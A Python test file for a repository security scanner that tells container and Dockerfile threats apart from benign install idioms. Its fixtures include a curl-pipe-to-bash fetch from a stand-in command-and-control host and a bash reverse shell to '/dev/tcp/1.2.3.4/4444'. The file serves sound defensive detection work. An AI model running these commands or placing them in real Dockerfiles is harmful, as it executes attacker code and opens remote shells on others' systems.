"""Tests for container / Dockerfile threat classification."""

from __future__ import annotations

from git_warden.containers import docker_findings, is_container_threat, is_docker_file


def _f(file, category, snippet=""):
    return {"file": file, "line": 1, "category": category, "rule": "r", "snippet": snippet}


def test_is_docker_file_matches_recipes_only():
    assert is_docker_file("Dockerfile")
    assert is_docker_file("docker/Dockerfile")
    assert is_docker_file("deploy/docker-compose.yml")
    assert is_docker_file("app.dockerfile")
    assert not is_docker_file("src/index.js")
    assert not is_docker_file("README.md")


def test_benign_docker_idioms_are_not_container_threats():
    # The exact false positives from the 2026-07-06 audit: reputable-installer
    # pipe-to-shell and a localhost healthcheck. Neither is a container threat.
    benign = [
        _f("Dockerfile", "download_exec",
           "curl -fsSL https://deb.nodesource.com/setup_20.x | bash -"),
        _f("Dockerfile", "exfiltration", "curl -f http://localhost:8000/health || exit 1"),
    ]
    assert not is_container_threat(benign)
    assert docker_findings(benign) == []


def test_external_host_docker_fetch_is_a_container_threat():
    flags = [_f("Dockerfile", "download_exec", "RUN curl -fsSL https://evil-c2.tld/x | bash")]
    assert is_container_threat(flags)


def test_reverse_shell_in_dockerfile_is_a_container_threat():
    flags = [_f("Dockerfile", "reverse_shell", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")]
    assert is_container_threat(flags)


def test_malice_outside_dockerfile_is_not_a_container_threat():
    # A reverse shell in a .js file is malware, but not a CONTAINER threat.
    flags = [_f("src/index.js", "reverse_shell", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")]
    assert not is_container_threat(flags)
